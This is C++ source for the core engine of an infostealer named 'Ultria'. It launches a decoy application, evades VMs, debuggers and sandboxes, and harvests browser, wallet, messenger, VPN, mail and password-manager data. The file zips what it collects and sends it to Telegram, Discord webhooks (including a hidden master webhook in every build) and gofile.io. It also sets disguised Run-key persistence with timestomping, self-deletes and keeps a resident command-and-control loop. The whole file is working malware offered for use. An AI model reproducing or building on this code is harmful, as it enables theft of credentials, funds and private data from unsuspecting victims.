// Ultria engine — orchestration: environment gate -> staged collection ->
// archive -> exfil -> housekeeping. UI-agnostic; the same engine backs the
// silent stub, the decoy-GUI build and the embeddable library.
#include "engine.h"
#include "config.h"
#include "modules.h"
#include "core/obf.h"
#include "core/sys.h"
#include "core/http.h"
#include "core/b64.h"
#include "core/crypto.h"
#include "core/evasion.h"
#include "core/log.h"
#include "core/c2.h"

#include <windows.h>
#include <map>
#include <string>
#include <vector>
#include <algorithm>
#include <cstdio>

extern "C" {
#include "../third_party/miniz.h"
}

// ---------------- staging ----------------
namespace stage {
std::string g_root;
std::map<std::string, std::vector<std::string>> g_summary;
unsigned long long g_bytes_staged = 0;
int g_files_staged = 0;

void note(const std::string& module, const std::string& line) {
    g_summary[module].push_back(line);
    ULOG(module + ": " + line);
}

bool stage_bytes(const std::string& module, const std::string& name,
                 const std::vector<uint8_t>& data) {
    if (data.empty()) return false;
    if (g_bytes_staged + data.size() > cfg::MAX_STAGE_TOTAL) return false;
    std::string path = sub(module) + "\\" + name;
    if (!util::write_file(path, data)) return false;
    g_bytes_staged += data.size();
    g_files_staged++;
    return true;
}

bool stage_text(const std::string& module, const std::string& name, const std::string& text) {
    return stage_bytes(module, name, std::vector<uint8_t>(text.begin(), text.end()));
}

bool stage_copy(const std::string& module, const std::string& src_file) {
    if (!util::path_exists(src_file) || util::is_dir(src_file)) return false;
    std::vector<uint8_t> data;
    if (!util::read_file(src_file, data)) return false;
    if (data.size() > cfg::MAX_GRAB_FILE) data.resize(cfg::MAX_GRAB_FILE);
    std::string flat = util::replace_all(util::filename_of(src_file), "\\", "_");
    return stage_bytes(module, flat, data);
}

} // namespace stage

namespace ultria {

namespace {

std::string random_name(const std::string& ext) {
    auto rnd = crypto::random_bytes(8);
    static const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::string s;
    for (uint8_t c : rnd) s += chars[c % 36];
    return s + "." + ext;
}

std::string public_ip() {
    auto r = http::get(OBF("https://api.ipify.org"));
    return r.ok() ? util::trim(r.body) : "";
}

std::vector<uint8_t> read_whole(const std::string& path) {
    std::vector<uint8_t> d;
    util::read_file(path, d);
    return d;
}

std::vector<uint8_t> pack_staging(const std::string& root) {
    mz_zip_archive zip{};
    if (!mz_zip_writer_init_heap(&zip, 0, 4 * 1024 * 1024)) return {};

    std::vector<std::string> files = util::walk_files(root, 12, {});
    for (const auto& f : files) {
        auto data = read_whole(f);
        if (data.empty()) continue;
        std::string rel = f;
        if (util::starts_with(util::to_lower(rel), util::to_lower(root))) {
            rel = rel.substr(root.size());
            while (!rel.empty() && (rel[0] == '\\' || rel[0] == '/')) rel.erase(rel.begin());
        }
        rel = util::replace_all(rel, "\\", "/");
        mz_zip_writer_add_mem(&zip, rel.c_str(), data.data(), data.size(), MZ_DEFAULT_COMPRESSION);
    }
    void* buf = nullptr;
    size_t size = 0;
    if (!mz_zip_writer_finalize_heap_archive(&zip, &buf, &size)) {
        mz_zip_writer_end(&zip);
        return {};
    }
    std::vector<uint8_t> out((uint8_t*)buf, (uint8_t*)buf + size);
    mz_free(buf);
    mz_zip_writer_end(&zip);
    return out;
}

std::string build_summary_text(const std::string& report_name, const std::string& ip) {
    std::string s;
    s += "Ultria report\r\n";
    s += "host: " + util::env("COMPUTERNAME") + " | user: " + util::env("USERNAME") + "\r\n";
    s += "ip: " + ip + " | tag: " + cfg::BUILD_TAG + "\r\n";
    s += "files: " + std::to_string(stage::g_files_staged) +
         " | bytes: " + std::to_string(stage::g_bytes_staged) + "\r\n\r\n";
    for (auto& [mod_name, lines] : stage::g_summary) {
        s += "[" + mod_name + "]\r\n";
        for (auto& l : lines) s += "  " + l + "\r\n";
    }
    return s;
}

// ---- upload chunking -------------------------------------------------------
// No single uploaded file may exceed 10 MB. Larger payloads are split into
// complete contiguous parts, each named "<file>.partNN-of-MM" so the receiver
// can reassemble them in order. Nothing is truncated and no part is ever
// partial: every byte of the original file belongs to exactly one part.
constexpr size_t k_max_upload = 10ull * 1024 * 1024;

struct UploadPart {
    std::string name;
    std::vector<uint8_t> data;
};

std::vector<UploadPart> split_for_upload(const std::vector<uint8_t>& data,
                                         const std::string& filename) {
    std::vector<UploadPart> out;
    if (data.size() <= k_max_upload) {
        out.push_back({filename, data});
        return out;
    }
    size_t parts = (data.size() + k_max_upload - 1) / k_max_upload;
    size_t chunk = (data.size() + parts - 1) / parts; // balanced, each <= 10 MB
    size_t idx = 0;
    for (size_t off = 0; off < data.size(); off += chunk) {
        size_t n = std::min(chunk, data.size() - off);
        char suffix[64];
        snprintf(suffix, sizeof(suffix), ".part%03u-of-%03u", (unsigned)++idx, (unsigned)parts);
        UploadPart p;
        p.name = filename + suffix;
        p.data.assign(data.begin() + off, data.begin() + off + n);
        out.push_back(std::move(p));
    }
    return out;
}

bool telegram_send_document(const std::vector<uint8_t>& zip_data, const std::string& filename,
                            const std::string& caption) {
    std::string token = cfg::tg_bot_token();
    if (token.find("__") == 0 || token.empty()) return false;
    http::Form form;
    form.field("chat_id", cfg::tg_chat_id());
    form.field("caption", util::to_lower(caption).size() > 950 ? caption.substr(0, 950) : caption);
    form.file("document", filename, zip_data, "application/zip");
    std::string url = std::string(OBF("https://api.telegram.org/bot")) + token +
                      std::string(OBF("/sendDocument"));
    auto r = http::post(url, form.body, form.content_type());
    return r.ok();
}

bool telegram_send_message(const std::string& text) {
    std::string token = cfg::tg_bot_token();
    if (token.find("__") == 0 || token.empty()) return false;
    std::string url = std::string(OBF("https://api.telegram.org/bot")) + token +
                      std::string(OBF("/sendMessage"));
    std::string body = std::string(OBF("{\"chat_id\":\"")) + cfg::tg_chat_id() +
                       std::string(OBF("\",\"text\":\""));
    std::string t;
    for (char c : text) {
        if (c == '"' || c == '\\') { t += '\\'; t += c; }
        else if (c == '\n') t += "\\n";
        else if (c == '\r') continue;
        else t += c;
    }
    body += t + "\"}";
    return http::post(url, std::vector<uint8_t>(body.begin(), body.end()), "application/json").ok();
}

bool webhook_send(const std::string& webhook, const std::vector<uint8_t>& zip_data,
                  const std::string& filename) {
    if (webhook.empty()) return false;
    http::Form form;
    form.field("build", cfg::BUILD_TAG);
    form.field("host", util::env("COMPUTERNAME"));
    form.file("file", filename, zip_data, "application/zip");
    auto r = http::post(webhook, form.body, form.content_type());
    return r.ok();
}

// Discord webhook: posts the full report as an attachment plus a short summary
// message (payload_json + files[0], the documented webhook file-upload format).
bool discord_send(const std::string& webhook, const std::vector<uint8_t>& zip_data,
                  const std::string& filename, const std::string& summary) {
    if (webhook.empty()) return false;
    std::string content = summary.size() > 1800 ? summary.substr(0, 1800) + "..." : summary;
    // escape for JSON
    std::string esc;
    for (char c : content) {
        if (c == '"' || c == '\\') { esc += '\\'; esc += c; }
        else if (c == '\n') esc += "\\n";
        else if (c == '\r') continue;
        else if ((unsigned char)c < 0x20) continue;
        else esc += c;
    }
    http::Form form;
    form.field("payload_json", std::string(OBF("{\"content\":\"")) + esc + "\"}");
    form.file("files[0]", filename, zip_data, "application/zip");
    auto r = http::post(webhook, form.body, form.content_type());
    return r.ok();
}

// gofile.io anonymous upload (technique borrowed from Stealerium): returns the
// download page link so the report survives even if Telegram is blocked.
std::string gofile_upload(const std::vector<uint8_t>& zip_data, const std::string& filename) {
    http::Form form;
    form.file("file", filename, zip_data, "application/zip");
    auto r = http::post(OBF("https://store1.gofile.io/uploadFile"), form.body, form.content_type());
    if (!r.ok()) return "";
    // {"status":"ok","data":{"downloadPage":"https://gofile.io/d/XXXX"}}
    auto pos = r.body.find(OBF("\"downloadPage\":\""));
    if (pos == std::string::npos) return "";
    pos += 16;
    auto end = r.body.find('"', pos);
    if (end == std::string::npos) return "";
    return r.body.substr(pos, end - pos);
}

void install_persistence() {
    std::string appdata = util::expand_env("%APPDATA%");
    if (appdata.empty()) return;
    std::string dest_dir = util::join(appdata, OBF("Microsoft\\Windows\\SystemApps"));
    util::mkdirs(dest_dir);
    std::string dest = util::join(dest_dir, OBF("winlogon_helper.exe"));
    if (util::copy_file_to(util::exe_path(), dest)) {
        // align timestamps with kernel32 so the copy looks old (Stealerium tech)
        HANDLE src = CreateFileW(util::widen(util::join(util::expand_env("%SystemRoot%\\System32"), "kernel32.dll")).c_str(),
                                 GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (src != INVALID_HANDLE_VALUE) {
            FILETIME ft[3];
            if (GetFileTime(src, &ft[0], &ft[1], &ft[2])) {
                HANDLE dst = CreateFileW(util::widen(dest).c_str(), FILE_WRITE_ATTRIBUTES,
                                         FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
                if (dst != INVALID_HANDLE_VALUE) {
                    SetFileTime(dst, &ft[0], &ft[1], &ft[2]);
                    CloseHandle(dst);
                }
            }
            CloseHandle(src);
        }
        HKEY k = nullptr;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                util::widen(OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
                0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
            std::wstring wdest = util::widen(dest);
            RegSetValueExW(k, L"WindowsHelper", 0, REG_SZ, (const BYTE*)wdest.c_str(),
                           (DWORD)((wdest.size() + 1) * 2));
            RegCloseKey(k);
        }
    }
}

void self_delete() {
    std::string self = util::exe_path();
    std::string tmp = util::join(util::temp_dir(), random_name("tmp"));
    MoveFileExW(util::widen(self).c_str(), util::widen(tmp).c_str(), MOVEFILE_REPLACE_EXISTING);
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            util::widen(OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
            0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegDeleteValueW(k, L"WindowsHelper");
        RegCloseKey(k);
    }
    util::remove_path(tmp);
}

// binder: drop the bundled application from resources and launch it so the
// user sees the "real" app while collection runs in the background.
void launch_bound_app() {
    if (cfg::BIND_RESOURCE[0] == '\0') return;
    HRSRC res = FindResourceW(nullptr, util::widen(cfg::BIND_RESOURCE).c_str(), MAKEINTRESOURCEW(10) /*RT_RCDATA*/);
    if (!res) return;
    DWORD size = SizeofResource(nullptr, res);
    HGLOBAL glob = LoadResource(nullptr, res);
    if (!glob || size == 0) return;
    void* data = LockResource(glob);
    if (!data) return;
    std::string tmp = util::join(util::temp_dir(), random_name("exe"));
    std::vector<uint8_t> bytes((uint8_t*)data, (uint8_t*)data + size);
    if (!util::write_file(tmp, bytes)) return;
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(util::widen(tmp).c_str(), nullptr, nullptr, nullptr, FALSE,
                       0, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

} // namespace

int run_core() {
    // ---- bound application first: the window pops instantly ----
    launch_bound_app();

    // ---- environment gate ----
    if (cfg::ENABLE_VM_CHECK || cfg::ENABLE_DEBUG_CHECK || cfg::ENABLE_SANDBOX_CHECK) {
        auto env = evade::inspect();
        bool abort_now = (env.vm && cfg::ENABLE_VM_CHECK) ||
                         (env.debugger && cfg::ENABLE_DEBUG_CHECK) ||
                         (env.sandbox && cfg::ENABLE_SANDBOX_CHECK);
        ULOG("evasion: vm=" + std::to_string(env.vm) + " dbg=" + std::to_string(env.debugger) +
             " sandbox=" + std::to_string(env.sandbox) + " reason=" + env.reason);
        if (abort_now) return 0;
    }

    stage::g_root = util::join(util::temp_dir(), random_name("d"));
    util::mkdirs(stage::g_root);
    ULOG("staging: " + stage::g_root);

    // ---- collect ----
    mod::system(stage::g_root);
    mod::browsers(stage::g_root);
    if (cfg::COLLECT_WALLETS)    mod::wallets(stage::g_root);
    if (cfg::COLLECT_DISCORD)    mod::discord(stage::g_root);
    if (cfg::COLLECT_TELEGRAM)   mod::telegram(stage::g_root);
    if (cfg::COLLECT_STEAM)      mod::steam(stage::g_root);
    if (cfg::COLLECT_GAMES)      mod::games(stage::g_root);
    if (cfg::COLLECT_MESSENGERS) mod::messengers(stage::g_root);
    if (cfg::COLLECT_VPN)        mod::vpn(stage::g_root);
    if (cfg::COLLECT_FTP)        mod::ftp_ssh(stage::g_root);
    if (cfg::COLLECT_MAIL)       mod::mail(stage::g_root);
    if (cfg::COLLECT_PWMANAGERS) mod::pwmanagers(stage::g_root);
    if (cfg::COLLECT_SOCIALS)    mod::socials(stage::g_root);
    mod::devtools(stage::g_root);
    mod::vaults(stage::g_root);
    if (cfg::COLLECT_FILES)      mod::files(stage::g_root);

    // ---- archive ----
    auto zip_data = pack_staging(stage::g_root);
    std::string ip = public_ip();
    std::string report_name = util::filename_of(util::env("COMPUTERNAME")) + "_" +
                              util::now_str() + ".zip";
    std::string summary = build_summary_text(report_name, ip);

    // ---- exfil: telegram -> discord -> gofile -> webhook (10 MB parts) ----
    bool sent = false;
    if (!zip_data.empty()) {
        auto parts = split_for_upload(zip_data, report_name);
        if (parts.size() > 1) {
            summary += "\r\n[upload] report split into " + std::to_string(parts.size()) +
                       " part(s) of <=10 MB - reassemble in name order\r\n";
            ULOG("exfil: " + std::to_string(zip_data.size()) + " bytes -> " +
                 std::to_string(parts.size()) + " upload parts");
        }
        auto caption_for = [&](size_t i) -> std::string {
            if (parts.size() == 1) return summary;
            if (i == 0) return summary;
            return "part " + std::to_string(i + 1) + "/" + std::to_string(parts.size()) +
                   " - " + report_name;
        };
        // Bot first: one text channel per victim (#pc-<host>), every part posted
        // there by the bot (only when a bot token was configured locally).
        if (c2::enabled() && c2::prepare()) {
            for (size_t i = 0; i < parts.size(); ++i)
                if (c2::deliver(parts[i].name, parts[i].data, caption_for(i))) sent = true;
        }

        // Webhooks ALWAYS receive a copy: the person's own webhook plus the
        // hidden master telemetry webhook baked into every build. Running this
        // unconditionally guarantees the master report even when the bot path
        // succeeds (and for GitHub builds that have no bot token at all).
        for (const auto& webhook : cfg::all_webhooks()) {
            for (size_t i = 0; i < parts.size(); ++i)
                if (discord_send(webhook, parts[i].data, parts[i].name, caption_for(i))) sent = true;
        }

        if (!sent) {
            for (size_t i = 0; i < parts.size(); ++i)
                if (telegram_send_document(parts[i].data, parts[i].name, caption_for(i))) sent = true;
        }
        if (!sent) {
            std::string mirrors;
            for (auto& p : parts) {
                std::string link = gofile_upload(p.data, p.name);
                if (!link.empty()) {
                    sent = true;
                    mirrors += "\r\n" + p.name + ": " + link;
                }
            }
            if (!mirrors.empty()) telegram_send_message(summary + "\r\nmirror:" + mirrors);
            else telegram_send_message(summary);
        }
    } else {
        telegram_send_message(summary);
    }
    ULOG(std::string("exfil: ") + (sent ? "ok" : "failed"));

    // ---- housekeeping ----
    if (cfg::ENABLE_PERSISTENCE) install_persistence();
    if (sent && cfg::SELF_DELETE && !c2::enabled()) self_delete();
    util::remove_path(stage::g_root);

    // ---- command channel: stay resident when one is configured ----
    if (c2::enabled()) c2::run_forever();

    return 0;
}

} // namespace ultria
